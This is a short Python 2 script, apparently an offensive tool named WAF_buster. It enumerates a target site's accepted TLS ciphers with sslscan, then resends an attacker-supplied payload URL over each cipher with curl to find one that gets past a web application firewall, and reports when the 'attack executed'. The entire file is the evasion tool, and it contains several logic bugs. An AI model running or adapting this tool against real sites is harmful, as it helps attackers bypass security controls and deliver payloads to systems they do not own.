#!/usr/bin/python2

import sys
import subprocess 
import requests as re
import os

def banner():
	print "[*]Usage: python WAF_buster.py --input"
	print "[*]Run this script only if the Payload_URL is getting blocked by firewall "

def check_response(argument):
        f=re.get(argument)
        g=f.status_code
	return g

def ssl_check(Domain,Site_Payload,Payload):
	file1=subprocess.Popen(["sslscan",Domain],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	output1,error1=file1.communicate()
	if "Could not resolve hostname" in output1:
		print "Some issues occured , Please Try Again !!!"
		main()
	else:
		open_file=open("file.txt",'w')
		open_file.write(output1)
		open_file.close()

		file_open=open("file.txt",'r')
		file22=open("cipher.txt",'w')
	
		for line in file_open:
                	if "Accepted" in line or "Preferred" in line:
                        	file22.write(line)
                	else:
                        	continue

		file22.close()
		file_open.close()

        	fi= open("escape_char_cipher.txt",'w')
		fm=open("cipher.txt",'r')

        	for line in fm:
			line=line.split(' ')
                	if len(line)<6:
				continue
			elif "Accepted" in line[0]:
				line=line[7]
				fi.write(line+"\n")
			else:
                		line=line[6]
				fi.write(line+"\n")
		fm.close()
        	fi.close()
	
		T1=open("escape_char_cipher.txt",'r')
		T2=open("final_cipher.txt",'w')

		for i in T1:
			if "32m" in i:
				i=i.lstrip("\x1b[32m")
				T2.write(i)
			elif "33m" in i:
				i=i.lstrip("\x1b[32m")
				T2.write(i)
			else:
				T2.write(i)
		T1.close()
		T2.close()

        	try:
			cipher_open=open("final_cipher.txt",'r')
                	for i in cipher_open:
                		file2=subprocess.Popen(["curl","--ciphers",i,Site_Payload],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                		output2,error2=file2.communicate()
				request=str(check_response(Site_Payload))
                        	if request in output2:
                        		print "\n\033[32mFirewall blocked Cipher %s\033[0m" %i
                        	elif Payload in output2:
                        		print "\n\033[32mFirewall Bypassed using Cipher:%s\033[0m" %i
					print "And attack executed"
                        	else:
                         	        print "\n\033[32mFirewall Bypassed using Cipher:%s\033[0m" %i
					print "But attack blocked"
                	cipher_open.close()
        	except Exception as ex:
        		print ex 
	
def main():
	if len(sys.argv)<2:
		banner()
	elif sys.argv[1]!= "--input":
		banner()
	else:
		Domain=raw_input("[1] Enter The Domain Or Subdomain with http:// or https://:\t")
		if "http" not in Domain or "https" not in Domain:
			print "Please Specify the protocol Schema"
			main()
		Site_Payload=raw_input("[2] Enter The Domain Or Subdomain alongwith the Payload:\t")
		if "http" not in Domain or "https" not in Domain:
			print "Please Specify the protocol Schema"
			main()
		Payload=raw_input("[3] Enter the Payload:\t")
		ssl_check(Domain,Site_Payload,Payload)
main()

